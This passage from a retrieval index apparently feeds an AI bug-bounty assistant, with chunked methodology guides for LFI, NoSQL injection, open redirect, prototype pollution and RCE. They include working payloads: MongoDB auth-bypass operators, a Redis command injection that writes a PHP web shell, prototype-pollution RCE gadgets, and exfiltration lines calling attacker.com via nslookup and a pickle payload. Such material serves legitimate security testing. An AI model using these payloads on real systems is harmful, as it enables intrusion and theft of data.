+    "text": "o construct arbitrary strings that get executed. This works even without write access to any file. Tool: `php_filter_chain_generator` on GitHub — generates the full chain payload from a target command.\n\n---\n\n## Impact Classification\n\n| Finding | Severity |\n|---|---|\n| `/etc/passwd` readable (non-shadow) | Medium |\n| Config files with DB credentials / API keys | High |\n| `/etc/shadow` readable | Critical |\n| SSH private key readable | Critical |\n| LFI → RCE via log poisoning | Critical |\n| Path traversal limited to non-sensitive dirs | Low |\n\n## Evidence Requirements\n1. Exact parameter and payload used\n2. Actual file content returned (redact after first line to avoid data exposure)\n3. HTTP request + truncated response (show first lines of `/etc/passwd`)\n4. For RCE escalation: include the full chain (log poison + include)\n\n## Do Not Report\n- Path traversal that's blocked (returns 403 or sanitized path, no file content)\n- Reading only non-sensitive application files that don't contain sec",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\lfi.md",
+        "mtime": 1775393895.28255,
+        "size": 4964,
+        "hash": "439e4b3791eadb05882abbef7cad29d282131c27d370da624bc2ba15e5a96a01"
+      }
+    }
+  },
+  "2692834499203795367": {
+    "chunk_id": "rag\\vulnerabilities\\lfi.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\lfi.md",
+    "text": "ding only non-sensitive application files that don't contain secrets\n- Directory listing without file content (different vuln class)\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\lfi.md",
+        "mtime": 1775393895.28255,
+        "size": 4964,
+        "hash": "439e4b3791eadb05882abbef7cad29d282131c27d370da624bc2ba15e5a96a01"
+      }
+    }
+  },
+  "2440068634037630262": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": "# NoSQL Injection — Hunting Methodology\n\n## What Is NoSQL Injection\n\nUnlike SQL injection which targets relational databases, NoSQL injection targets document stores (MongoDB), key-value stores (Redis), and graph databases. The attack patterns differ significantly — instead of `' OR 1=1`, attackers inject **operator objects** or **JavaScript** into query parameters.\n\nMost common target: **MongoDB** in Node.js/Express apps.\n\n---\n\n## MongoDB Operator Injection\n\n### How It Happens\n\nVulnerable Node.js/Express code:\n```javascript\n// Vulnerable — user input directly merged into query\nconst user = await User.findOne({ email: req.body.email, password: req.body.password });\n\n// If attacker sends: {\"email\": \"admin@target.com\", \"password\": {\"$gt\": \"\"}}\n// MongoDB query becomes: {email: \"admin@target.com\", password: {$gt: \"\"}}\n// $gt: \"\" means \"password greater than empty string\" → matches ANY password!\n```\n\n### Detection Payloads\n\n**In JSON body** — replace string value with operator object:\n```j",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "7733817706752644332": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": "In JSON body** — replace string value with operator object:\n```json\n{\"username\": \"admin\", \"password\": {\"$gt\": \"\"}}\n{\"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"}}\n{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$gt\": \"\"}}\n{\"username\": {\"$in\": [\"admin\", \"administrator\", \"root\"]}, \"password\": {\"$gt\": \"\"}}\n```\n\n**In URL query parameters** (bracket notation):\n```\n/login?user=admin&password[$gt]=\n/search?query[$regex]=.*&query[$options]=i\n/api/users?role[$ne]=user\n```\n\n**If the app parses URL params as objects** (qs library with default settings):\n```\n/login?username=admin&password[$gt]=&password[$lt]=zzz\n```\n\n---\n\n## Auth Bypass via `$ne` / `$gt`\n\n**Most impactful single payload — bypasses login without knowing the password:**\n\n```json\nPOST /api/login\nContent-Type: application/json\n\n{\"email\": \"admin@target.com\", \"password\": {\"$ne\": \"x\"}}\n```\n\nIf response returns a valid session token → **authentication bypass = Critical.**\n\nVariations:\n```json\n{\"email\": {\"$gt\": \"\"}, \"password\": {\"$g",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "2314842025991309470": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": ".**\n\nVariations:\n```json\n{\"email\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}   // Login as first user in DB\n{\"email\": \"admin@target.com\", \"password\": {\"$exists\": false}}  // Password field doesn't need to exist\n{\"email\": {\"$regex\": \".*admin.*\"}, \"password\": {\"$gt\": \"\"}}    // Regex username match\n```\n\n---\n\n## Data Extraction via `$regex`\n\nEven without auth bypass, `$regex` allows blind data extraction similar to blind SQLi:\n\n**Step 1 — Confirm regex injection:**\n```json\n{\"username\": {\"$regex\": \"^a\"}}  // Does this return different results for admin vs non-admin?\n```\n\n**Step 2 — Extract data character by character (suggest to user to script this):**\n```json\n{\"username\": {\"$regex\": \"^a\"}}  → if true, first char is 'a'\n{\"username\": {\"$regex\": \"^ad\"}} → confirm second char\n{\"username\": {\"$regex\": \"^adm\"}} → continue...\n```\n\n**Step 3 — Extract all usernames:**\n```json\n{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$gt\": \"\"}}  // Returns all users\n```\n\n---\n\n## JavaScript Injection (Server-Side JS ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "8063965085864903507": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": "rns all users\n```\n\n---\n\n## JavaScript Injection (Server-Side JS Execution)\n\nOlder MongoDB (< 4.4) supported `$where` with JavaScript expressions. If still in use:\n\n```json\n{\"$where\": \"this.username == 'admin' && sleep(5000)\"}\n```\n\nIf the request takes 5+ seconds → **blind NoSQL injection via `$where` confirmed.**\n\n**Data extraction via `$where`:**\n```json\n{\"$where\": \"this.password.match(/^p/)\"}  // True if password starts with 'p'\n```\n\n**RCE attempt (MongoDB < 2.4 / very old):**\n```json\n{\"$where\": \"function() { return db.version(); }\"}\n```\n\n> Modern MongoDB (4.x+) disables `$where` by default. Still worth testing legacy apps.\n\n---\n\n## Redis Injection\n\nIf application uses Redis for session/cache and incorporates user input into Redis commands:\n\n**CRLF injection into Redis commands:**\n```\nuser=test\\r\\nCONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename shell.php\\r\\nSET x \"<?php system($_GET['c']); ?>\"\\r\\nBGSAVE\n```\n\nThis is largely theoretical unless the app blindly concatenates user i",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "7633539991876055247": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": "s largely theoretical unless the app blindly concatenates user input into raw Redis protocol. Look for apps that use Redis as a message queue with user-controlled channel names or keys.\n\n---\n\n## GraphQL + NoSQL Injection\n\nIf app uses MongoDB behind a GraphQL API, operator injection may work through GraphQL arguments:\n\n```graphql\n{\n  user(filter: \"{\\\"password\\\": {\\\"$gt\\\": \\\"\\\"}}\") {\n    email\n    apiKey\n  }\n}\n```\n\nOr if input is parsed as a filter object directly:\n```graphql\n{\n  users(where: {password: {_gt: \"\"}}) {\n    email\n  }\n}\n```\n\n---\n\n## Identifying MongoDB/NoSQL Apps\n\n**Signs the app uses MongoDB:**\n- Stack traces mentioning `MongoError`, `mongoose`, `mongodb`\n- Error messages: `CastError`, `ValidationError`, `ObjectId`\n- ObjectId-style IDs in responses: `\"id\": \"507f1f77bcf86cd799439011\"` (24 hex chars)\n- `_id` field in JSON responses\n- `package.json` (if accessible) showing `mongoose` or `mongodb` dependencies\n- JS files mentioning `.find({`, `.findOne({`, `.aggregate(`\n\n---\n\n#",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "8253112219236621950": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": " files mentioning `.find({`, `.findOne({`, `.aggregate(`\n\n---\n\n## Bypassing Input Validation\n\nMany apps use JSON Schema validation but only validate types at top level:\n\n```json\n// Validation expects: {\"password\": \"string\"}\n// But some validators allow objects if union types not specified\n{\"password\": {\"$gt\": \"\"}}\n```\n\nTry both:\n1. Direct operator in JSON body\n2. `Content-Type: application/x-www-form-urlencoded` with `password[$gt]=`\n3. Mixed — some fields as strings, target field as operator\n\n---\n\n## Impact Classification\n\n| Scenario | Severity |\n|---|---|\n| Auth bypass via `$ne`/`$gt` on login | Critical |\n| Data extraction via `$regex` (any user data) | High |\n| Auth bypass → admin panel access | Critical |\n| `$where` JavaScript injection confirmed | High/Critical |\n| Operator injection with limited data exposure | Medium |\n| Injection in search (no auth bypass, no sensitive data) | Low/Medium |\n\n## Evidence Requirements\n1. Exact payload injected (JSON body or URL params)\n2. Respons",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "284740652815986781": {
+    "chunk_id": "rag\\vulnerabilities\\nosqli.md::chunk::6",
+    "doc_id": "rag\\vulnerabilities\\nosqli.md",
+    "text": "s\n1. Exact payload injected (JSON body or URL params)\n2. Response showing successful auth bypass OR extracted data\n3. Comparison: normal request vs injected request\n4. For blind extraction: show the binary search process output\n\n## Do Not Report\n- NoSQL injection attempts that return the same response as a normal request (not vulnerable)\n- Injection in pure read-only endpoints with no sensitive data returned\n- Operator injection filtered by input validation (show attempted bypass first)\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 6,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\nosqli.md",
+        "mtime": 1775393895.28255,
+        "size": 6344,
+        "hash": "b8a69bd2902958c276d4783c2d752c8db3e47d882ad521d9d503d7cc7949f35a"
+      }
+    }
+  },
+  "1281253460748327177": {
+    "chunk_id": "rag\\vulnerabilities\\open-redirect.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\open-redirect.md",
+    "text": "# Open Redirect — Hunting Methodology\n\n## What Is an Open Redirect\n\nThe application uses user-controlled input to construct a redirect URL without validating the destination, allowing an attacker to redirect a victim who clicks a legitimate-looking link to a malicious site.\n\n**Standalone open redirect is generally LOW severity.** It becomes **Medium–High** when chained with other vulnerabilities (OAuth token theft, credential harvesting via trusted domain, etc.).\n\n---\n\n## Finding Open Redirect Entry Points\n\n**Parameters commonly used for redirects:**\n- `?next=`, `?redirect=`, `?url=`, `?return=`, `?dest=`, `?destination=`\n- `?goto=`, `?target=`, `?redir=`, `?redirect_uri=`, `?continue=`\n- `?back=`, `?returnTo=`, `?from=`, `?forward=`, `?ref=`\n- `?successUrl=`, `?failUrl=`, `?callback=`\n\n**In HTTP headers:**\n- `Referer:` header used by app to redirect back\n- `Location:` response header that accepts tainted input\n\n---\n\n## Detection Payloads (suggest to user)\n\n**Basic test:**\n`?next=https",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\open-redirect.md",
+        "mtime": 1775393895.2835505,
+        "size": 4130,
+        "hash": "2061bb2d20017a8910b8b9c67d5e5a8f715ce2c7da2bc8a06342c8f68c64a448"
+      }
+    }
+  },
+  "7504039297716990373": {
+    "chunk_id": "rag\\vulnerabilities\\open-redirect.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\open-redirect.md",
+    "text": "tection Payloads (suggest to user)\n\n**Basic test:**\n`?next=https://evil.com`\n\nIf redirected to `evil.com` → Open redirect confirmed.\n\n**If only same-domain redirects allowed (relative path bypass):**\n- `?next=//evil.com` — protocol-relative URL\n- `?next=///evil.com` — triple slash\n- `?next=////evil.com`\n- `?next=/\\evil.com` — backslash confusion (some browsers)\n- `?next=https:evil.com` → colon confusion\n\n**Domain allowlist bypass:**\nIf app only allows certain domains, try:\n- `?next=https://evil.com\\@allowed.com` — confuse parser\n- `?next=https://allowed.com.evil.com` — subdomain confusion\n- `?next=https://allowed.com@evil.com` — userinfo confusion\n- `?next=javascript:alert(1)` → open redirect + XSS if reflected in `href`\n\n**URL encoding bypass:**\n- `?next=https:%2F%2Fevil.com`\n- `?next=https%3A%2F%2Fevil.com`\n\n---\n\n## Standalone vs Chained Impact\n\n| Scenario | Severity |\n|---|---|\n| Open redirect on OAuth callback (`redirect_uri`) → token theft | High |\n| Open redirect on password rese",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\open-redirect.md",
+        "mtime": 1775393895.2835505,
+        "size": 4130,
+        "hash": "2061bb2d20017a8910b8b9c67d5e5a8f715ce2c7da2bc8a06342c8f68c64a448"
+      }
+    }
+  },
+  "8714804668077239817": {
+    "chunk_id": "rag\\vulnerabilities\\open-redirect.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\open-redirect.md",
+    "text": "ct_uri`) → token theft | High |\n| Open redirect on password reset flow → intercept reset link | High |\n| Open redirect after login → phish credentials on attacker site | Medium |\n| Open redirect in email confirmation link | Medium |\n| Bare open redirect with no auth context | Low / Informational |\n| `javascript:` URI causing XSS via redirect | High (XSS, report as XSS) |\n\n**Most bug bounty programs will reject bare open redirects unless chained.** Always look for an auth context: OAuth, password reset, login flow, email verification.\n\n---\n\n## OAuth Open Redirect (High Severity)\n\nThe most valuable open redirect scenario:\n\n1. OAuth flow uses `redirect_uri` parameter\n2. Server validates that `redirect_uri` starts with `https://app.com/callback`\n3. Open redirect at `https://app.com/callback?next=https://evil.com`\n4. Attacker crafts OAuth URL with redirect to the open redirect:\n   `https://auth.provider.com/oauth?...&redirect_uri=https://app.com/callback%3Fnext%3Dhttps%3A%2F%2Fevil.com`\n5. ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\open-redirect.md",
+        "mtime": 1775393895.2835505,
+        "size": 4130,
+        "hash": "2061bb2d20017a8910b8b9c67d5e5a8f715ce2c7da2bc8a06342c8f68c64a448"
+      }
+    }
+  },
+  "2660018371783594958": {
+    "chunk_id": "rag\\vulnerabilities\\open-redirect.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\open-redirect.md",
+    "text": "ri=https://app.com/callback%3Fnext%3Dhttps%3A%2F%2Fevil.com`\n5. Victim authorizes → provider redirects to `app.com/callback?next=evil.com` (allowed)\n6. `app.com` opens redirects to `evil.com` → **authorization code in Referer header is sent to evil.com**\n\nIf authorization code in URL + open redirect exists → chain is High severity.\n\n---\n\n## Evidence Requirements\n\n**To report as standalone (Low/Medium):**\n- Exact parameter and URL\n- HTTP response showing `Location: https://evil.com` or browser redirect confirmed\n- Explain WHY this is not intended (victim trust in domain)\n\n**To report as chained (Medium/High):**\n- Full exploit chain documented step by step\n- Explain the business impact (credential phishing, OAuth token theft)\n- PoC link: `https://target.com/login?next=https://evil.com` → copy this link format\n\n---\n\n## Do Not Report\n- Open redirect in admin panels (low risk, limited victim pool)\n- Open redirect where destination is validated against an allowlist AND bypass fails\n- Open re",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\open-redirect.md",
+        "mtime": 1775393895.2835505,
+        "size": 4130,
+        "hash": "2061bb2d20017a8910b8b9c67d5e5a8f715ce2c7da2bc8a06342c8f68c64a448"
+      }
+    }
+  },
+  "2236932611379521171": {
+    "chunk_id": "rag\\vulnerabilities\\open-redirect.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\open-redirect.md",
+    "text": "ion is validated against an allowlist AND bypass fails\n- Open redirect where the only value is \"looks like a legit link\" with no auth context\n- Open redirect to subdomains the attacker doesn't control (e.g., `app.target.com` → `other.target.com`)\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\open-redirect.md",
+        "mtime": 1775393895.2835505,
+        "size": 4130,
+        "hash": "2061bb2d20017a8910b8b9c67d5e5a8f715ce2c7da2bc8a06342c8f68c64a448"
+      }
+    }
+  },
+  "6300875245230521788": {
+    "chunk_id": "rag\\vulnerabilities\\prototype-pollution.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\prototype-pollution.md",
+    "text": "# Prototype Pollution — Hunting Methodology\n\n## What Is Prototype Pollution\n\nEvery JavaScript object inherits from `Object.prototype`. If attacker-controlled input can add properties to `Object.prototype`, those properties appear on ALL objects in the application — enabling XSS, auth bypass, denial of service, or even RCE (server-side).\n\nTwo distinct types:\n- **Client-side prototype pollution** → DOM XSS, UI manipulation\n- **Server-side prototype pollution (SSPP)** → RCE, auth bypass in Node.js\n\n---\n\n## Client-Side Prototype Pollution\n\n### Finding Entry Points\n\n**URL query parameters parsed by custom code:**\n```\nhttps://target.com/page?__proto__[isAdmin]=true\nhttps://target.com/page?constructor[prototype][isAdmin]=true\n```\n\n**URL hash:**\n```\nhttps://target.com/page#__proto__[isAdmin]=true\n```\n\n**JSON body when merged shallowly:**\n```json\n{\"__proto__\": {\"isAdmin\": true}}\n{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}\n```\n\n**localStorage/sessionStorage values** that get merged into co",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\prototype-pollution.md",
+        "mtime": 1775393895.2841012,
+        "size": 4579,
+        "hash": "6a19302d3271e24b80ee9f2094c2960aa791a80d7b315d250629aa78e7512857"
+      }
+    }
+  },
+  "7037092526954428021": {
+    "chunk_id": "rag\\vulnerabilities\\prototype-pollution.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\prototype-pollution.md",
+    "text": "\n\n**localStorage/sessionStorage values** that get merged into config objects.\n\n### Detection Probe\n\nInject into any parameter that gets parsed into an object:\n```\n?__proto__[testprop]=polluted\n?constructor[prototype][testprop]=polluted\n```\n\nThen check in browser console:\n```javascript\n({}).testprop  // Should return 'polluted' if vulnerable\n```\n\n### Escalating to XSS\n\nLook for gadgets — patterns in the app's JS code that use prototype properties as HTML sink inputs:\n\n```javascript\n// Common gadget patterns\ndocument.write(config.targetElement || 'default')\nelement.innerHTML = options.template || ''\n$('<div>').html(settings.content || '')\n```\n\nIf `config.targetElement` gets its value from `Object.prototype.targetElement` → injecting HTML via prototype = DOM XSS.\n\n**Tool to suggest:** [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) (Burp Suite) — automated prototype pollution gadget finder.\n\n---\n\n## Server-Side Prototype Pollution (SSPP) — Node.js\n\n### ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\prototype-pollution.md",
+        "mtime": 1775393895.2841012,
+        "size": 4579,
+        "hash": "6a19302d3271e24b80ee9f2094c2960aa791a80d7b315d250629aa78e7512857"
+      }
+    }
+  },
+  "8016756277187570530": {
+    "chunk_id": "rag\\vulnerabilities\\prototype-pollution.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\prototype-pollution.md",
+    "text": "\n\n---\n\n## Server-Side Prototype Pollution (SSPP) — Node.js\n\n### Why It's Different\n\nOn the server, polluting `Object.prototype` affects ALL objects in the Node.js process. This can:\n- Override security checks (`isAdmin`, `authenticated`)\n- Manipulate child process options → `shell: true` → RCE\n- Break JSON serialization → Denial of service\n\n### Detection — JSON Body Injection\n\nSend a POST/PUT with `__proto__` in JSON:\n```json\n{\"__proto__\": {\"status\": 444}}\n```\n\n**If the HTTP response status code changes to 444** → `Object.prototype.status` was used somewhere in the response logic → **SSPP confirmed**.\n\nAlternative detection:\n```json\n{\"__proto__\": {\"outputFunctionName\": \"x;process.mainModule.require('child_process').execSync('id')//x\"}}\n```\n*(This is a Pug template engine RCE gadget — only for confirmed SSPP)*\n\n### Safe Detection Probes\n\nTo confirm without triggering RCE:\n```json\n{\"__proto__\": {\"json spaces\": 10}}\n```\nIf JSON responses suddenly become pretty-printed with large indentati",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\prototype-pollution.md",
+        "mtime": 1775393895.2841012,
+        "size": 4579,
+        "hash": "6a19302d3271e24b80ee9f2094c2960aa791a80d7b315d250629aa78e7512857"
+      }
+    }
+  },
+  "480974450853619666": {
+    "chunk_id": "rag\\vulnerabilities\\prototype-pollution.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\prototype-pollution.md",
+    "text": "ON responses suddenly become pretty-printed with large indentation → SSPP confirmed (Express/body-parser uses `json spaces`).\n\n```json\n{\"__proto__\": {\"exposedHeaders\": [\"X-Custom-Polluted\"]}}\n```\nIf `X-Custom-Polluted` appears in CORS response headers → SSPP confirmed via cors package.\n\n### SSPP → RCE Gadget Chains\n\nOnce SSPP is confirmed, look for known Node.js gadget chains:\n\n| Package | Gadget | RCE Method |\n|---|---|---|\n| **child_process** | `shell: true` on `spawn()` | Inject `{\"__proto__\":{\"shell\":\"/bin/bash\",\"env\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\"}}}` |\n| **Pug** | `outputFunctionName` | Template renders arbitrary JS |\n| **EJS** | `outputFunctionName` or `settings['view options']` | Code injection in template |\n| **Handlebars** | `__proto__` bypass in compiled template | Code execution |\n\n**Tool to suggest:** [server-side-prototype-pollution](https://github.com/nicowillis/server-side-prototype-pollution) scanner, or use Burp's Backslash Powered Scanner.\n\n---\n\n## Im",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\prototype-pollution.md",
+        "mtime": 1775393895.2841012,
+        "size": 4579,
+        "hash": "6a19302d3271e24b80ee9f2094c2960aa791a80d7b315d250629aa78e7512857"
+      }
+    }
+  },
+  "8126306452979596817": {
+    "chunk_id": "rag\\vulnerabilities\\prototype-pollution.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\prototype-pollution.md",
+    "text": "n) scanner, or use Burp's Backslash Powered Scanner.\n\n---\n\n## Impact Classification\n\n| Scenario | Severity |\n|---|---|\n| Client-side → DOM XSS via gadget | High |\n| SSPP confirmed (no RCE gadget found) | Medium/High |\n| SSPP + RCE via known gadget chain | Critical |\n| SSPP → auth bypass (`isAdmin: true`) | Critical |\n| SSPP → DoS (crash Node process) | Medium |\n| Client-side PP without usable gadget | Low/Informational |\n\n## Evidence Required\n- Probe input used\n- Proof of pollution (console output of `({}).prop`, or JSON response change)\n- For SSPP: response behavior change that confirms prototype was modified\n- For RCE: `id` command output or OOB DNS\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\prototype-pollution.md",
+        "mtime": 1775393895.2841012,
+        "size": 4579,
+        "hash": "6a19302d3271e24b80ee9f2094c2960aa791a80d7b315d250629aa78e7512857"
+      }
+    }
+  },
+  "6555702427644675739": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "# RCE — Remote Code Execution Hunting Methodology\n\n## Attack Vectors to Hunt\n\n| Vector | Description | Priority |\n|---|---|---|\n| OS Command Injection | User input passed to shell without sanitization | Critical |\n| Code Injection | User input evaluated as code (`eval`, `exec`) | Critical |\n| Deserialization | Untrusted object deserialization | Critical |\n| File Upload + Execution | Upload webshell to executable path | Critical |\n| Template Injection (SSTI) | Template engine evaluates user input | Critical |\n| XML / XXE → SSRF → RCE | XXE → internal service → code exec | Critical |\n| Dependency Confusion / Supply Chain | Out of scope for most BB programs | N/A |\n\n---\n\n## 1. OS Command Injection\n\n**Common Sinks:**\n- `exec()`, `system()`, `popen()`, `subprocess()`, `shell_exec()`, `passthru()`\n- Python: `os.system()`, `subprocess.run(shell=True)`, `eval()`\n- Node.js: `child_process.exec()`, `child_process.spawn()` with shell=true\n\n**Source Code Red Flags:**\n```\n# Python — vulnerable\nos.s",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "8008834794962927008": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "=true\n\n**Source Code Red Flags:**\n```\n# Python — vulnerable\nos.system(f\"ping {user_input}\")\nsubprocess.run(f\"convert {filename}\", shell=True)\n\n# PHP — vulnerable: user-controlled parameter concatenated into OS command function\n# Exact sink names: exec(), passthru(), shell_exec() — see PayloadsAllTheThings RCE\nexec(\"whois \" . $ip);\n\n# Node.js — vulnerable\nexec(`git clone ${url}`)\n```\n\n**Injection Payloads (suggest to user):**\n- Append command: `; id`, `| id`, `&& id`\n- Backtick: `` `id` ``\n- Newline: `%0a id`\n- Blind (OOB): `; nslookup $(whoami).attacker.com`\n- Blind time: `; sleep 5`\n\n**Bypass Common Filters:**\n- Space bypass: `${IFS}`, `{id}`, `%09` (tab)\n- Slash bypass: `${PATH:0:1}` = `/`\n- Quote bypass: mix single and double quotes\n\n---\n\n## 2. Deserialization RCE\n\n**Languages to Target:**\n\n| Language | Libraries/Formats | Attack Path |\n|---|---|---|\n| Java | `ObjectInputStream`, XStream, Jackson | Gadget chain → RCE |\n| PHP | `unserialize()` | Magic methods → arbitrary code |\n| Pyt",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "7599210162745798586": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\rce.md",
+    "text": "| PHP | `unserialize()` | Magic methods → arbitrary code |\n| Python | `pickle.loads()`, `yaml.load()` (unsafe) | `__reduce__` → OS command |\n| Ruby | `Marshal.load()` | Gadget chain |\n| Node.js | `node-serialize` | IIFE in JSON |\n| .NET | `BinaryFormatter`, JSON.NET with TypeNameHandling | Gadget chain |\n\n**Detection (suggest to user to look for):**\n- Base64-encoded data in cookies or POST bodies that look like serialized objects\n- Cookie values starting with `rO0` (Java), `O:` (PHP), or pickle magic bytes (`\\x80\\x04`)\n- Endpoints that accept XML/YAML blobs\n- APIs that accept raw object data and reflect it back\n\n**PHP `unserialize` Quick Check:**\nInject `O:8:\"stdClass\":0:{}` — if it doesn't throw an error, deserialization is active.\nThen test gadget chains from phpggc: `phpggc Laravel/RCE1 system id`\n\n**Python `pickle` Confirm:**\nInject a pickle payload that triggers DNS: \n```python\nimport pickle, base64\nclass X:\n    def __reduce__(self): return (os.system, ('nslookup attacker.com',))\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\rce.md",
+        "mtime": 1775393895.2846246,
+        "size": 6125,
+        "hash": "ffbc2f568704db1af0bcaef3b3e191ca23b4041c790208472d92b92d237406c9"
+      }
+    }
+  },
+  "418706813345314838": {
+    "chunk_id": "rag\\vulnerabilities\\rce.md::chunk::3",
